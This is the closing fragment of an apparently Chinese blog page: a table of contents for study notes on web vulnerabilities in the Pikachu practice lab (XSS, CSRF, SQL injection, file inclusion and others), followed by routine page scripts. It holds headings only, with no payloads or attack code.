href="#token%E9%98%B2%E6%9A%B4%E7%A0%B4%EF%BC%9F"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">token防暴破？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B8%B8%E8%A7%81%E7%9A%84%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">暴力破解常见的防范措施</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">xss（跨站脚本攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xss-%E7%AA%83%E5%8F%96cookie-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">xss(窃取cookie)攻击流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E5%8F%8A%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">xss漏洞分类及攻击流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%80%A7xss%EF%BC%88get-amp-post%EF%BC%89%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">反射性xss（get&amp;post）学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">存储型xss学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dom%E5%9E%8BXss%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">dom型Xss学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dom%E5%9E%8Bxss-x%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.3.2.6.</span> <span class="toc-text">dom型xss-x学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E7%9B%B2%E6%89%93%E5%92%8C%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.7.</span> <span class="toc-text">xss盲打和原理分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E7%9A%84%E7%BB%95%E8%BF%87%E5%92%8C%E8%BF%87%E6%BB%A4%EF%BC%88filter-amp-htmlspecialchars%EF%BC%89"><span class="toc-number">1.3.2.8.</span> <span class="toc-text">xss的绕过和过滤（filter&amp;htmlspecialchars）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E5%8D%B1%E5%AE%B3%EF%BC%9A%E8%8E%B7%E5%8F%96cookie%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.3.2.9.</span> <span class="toc-text">xss危害：获取cookie的原理和危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xss%E5%8D%B1%E5%AE%B3-XSS%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E6%BC%94%E7%A4%BA"><span class="toc-number">1.3.2.10.</span> <span class="toc-text">xss危害-XSS进行钓鱼的原理和演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E5%8D%B1%E5%AE%B3XSS%E8%8E%B7%E5%8F%96%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%8E%9F%E7%90%86%E5%92%8C%E6%BC%94%E7%A4%BA"><span class="toc-number">1.3.2.11.</span> <span class="toc-text">XSS危害XSS获取键盘记录原理和演示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E5%B8%B8%E8%A7%81%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">1.3.2.12.</span> <span class="toc-text">XSS常见防范措施</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.3.3.</span> <span class="toc-text">CSRF（跨站请求伪造漏洞）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#csrf%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">csrf漏洞概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#scrf%EF%BC%88get-post%EF%BC%89%E6%BC%94%E7%A4%BA%E5%92%8C%E8%A7%A3%E6%9E%90"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">scrf（get&#x2F;post）演示和解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8Dcsrf-token"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">反csrf token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81CSRF%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">常见CSRF防范措施</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REC%EF%BC%88%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">REC（代码&#x2F;命令执行）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-inclusion%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.3.5.</span> <span class="toc-text">file inclusion（文件包含漏洞）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">文件包含原理以及本地文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">本地文件包含漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA"><span class="toc-number">1.3.5.3.</span> <span class="toc-text">远程文件包含漏洞演示</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe-file-downloads-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.6.</span> <span class="toc-text">Unsafe file downloads(不安全的文件下载漏洞)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe-file-uploads-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.3.7.</span> <span class="toc-text">Unsafe file uploads(不安全的文件上传)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B9%8BMINE-type%E9%AA%8C%E8%AF%81%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.7.1.</span> <span class="toc-text">文件上传漏洞之MINE type验证原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8Bgetimagesize%E7%BB%95%E8%BF%87%E5%92%8C%E9%98%B2%E8%8C%83"><span class="toc-number">1.3.7.2.</span> <span class="toc-text">文件上传之getimagesize绕过和防范</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="toc-number">1.3.7.3.</span> <span class="toc-text">防范措施</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Over-Permisson%EF%BC%88%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.3.8.</span> <span class="toc-text">Over Permisson（越权漏洞）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">越权漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="toc-number">1.3.8.2.</span> <span class="toc-text">水平越权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="toc-number">1.3.8.3.</span> <span class="toc-text">垂直越权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%A6-%E2%80%A6-%E2%80%A6-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">1.3.9.</span> <span class="toc-text">…&#x2F;…&#x2F;…&#x2F;(目录遍历)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88can-see-your-ABC%EF%BC%89"><span class="toc-number">1.3.10.</span> <span class="toc-text">敏感信息泄露（can see your ABC）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.11.</span> <span class="toc-text">php反序列化漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xxe-xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.12.</span> <span class="toc-text">xxe(xml外部实体攻击)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84url%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.3.13.</span> <span class="toc-text">不安全的url重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="toc-number">1.3.14.</span> <span class="toc-text">SSRF（服务器端请求伪造）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql-inject%EF%BC%88SQL%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.3.15.</span> <span class="toc-text">sql inject（SQL注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-inject%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-number">1.3.15.1.</span> <span class="toc-text">sql inject漏洞原理概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Inject%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.15.2.</span> <span class="toc-text">SQL Inject攻击流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.15.3.</span> <span class="toc-text">常见注入点的类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.15.4.</span> <span class="toc-text">注入方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#pikachu-SQL-Inject-%E6%95%B0%E5%AD%97%E5%9E%8B"><span class="toc-number">1.3.15.4.1.</span> <span class="toc-text">pikachu-SQL-Inject-数字型</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#pikachu-SQL-Inject-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.15.4.2.</span> <span class="toc-text">pikachu-SQL-Inject-字符型注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.15.4.3.</span> <span class="toc-text">搜索型注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XX%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.15.4.4.</span> <span class="toc-text">XX型注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL-Inject%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%9F%BA%E4%BA%8Eunion%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%EF%BC%88select%EF%BC%89"><span class="toc-number">1.3.15.4.5.</span> <span class="toc-text">SQL Inject漏洞手工测试：基于union联合查询的信息获取（select）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87information-schema%E6%8B%BF%E4%B8%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%E5%AE%8C%E6%95%B4%E6%A1%88%E4%BE%8B"><span class="toc-number">1.3.15.4.6.</span> <span class="toc-text">通过information_schema拿下数据库手工测试完整案例</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL-Inject%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%EF%BC%88select-delete-update-insert%EF%BC%89"><span class="toc-number">1.3.15.4.7.</span> <span class="toc-text">SQL Inject漏洞手工测试基于报错信息获取（select&#x2F;delete&#x2F;update&#x2F;insert）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E4%BA%8Ehttp-header%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.15.4.8.</span> <span class="toc-text">SQL注入漏洞-基于http header的注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.15.4.9.</span> <span class="toc-text">SQL注入漏洞-盲注</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="toc-number">1.3.15.4.10.</span> <span class="toc-text">远程控制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL-Inject%E6%BC%8F%E6%B4%9E%E4%B9%8B%E8%A1%A8-%E5%88%97-%E5%90%8D%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.3.15.4.11.</span> <span class="toc-text">SQL Inject漏洞之表(列)名的暴力破解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB-SQL-MAP%E8%BF%9B%E8%A1%8Csql-inject%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.15.4.12.</span> <span class="toc-text">自动化注入攻击(SQL-MAP进行sql inject攻击)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%B8%B8%E8%A7%81%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-number">1.3.15.4.13.</span> <span class="toc-text">SQL注入漏洞的常见防护措施</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">1.4.</span> <span class="toc-text">参考资料</span></a></li></ol></li></ol>
                                  </div>
                              </button>
                          
                          
                      
                    
                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
                  </div>
              </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

 

<script async src="/js/app.js?v=1681885929799"></script>

<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
<script>
	$(".justified-gallery").justifiedGallery({
		rowHeight: 160,
		margins: 10,
	});
</script>


    





</body>

</html>
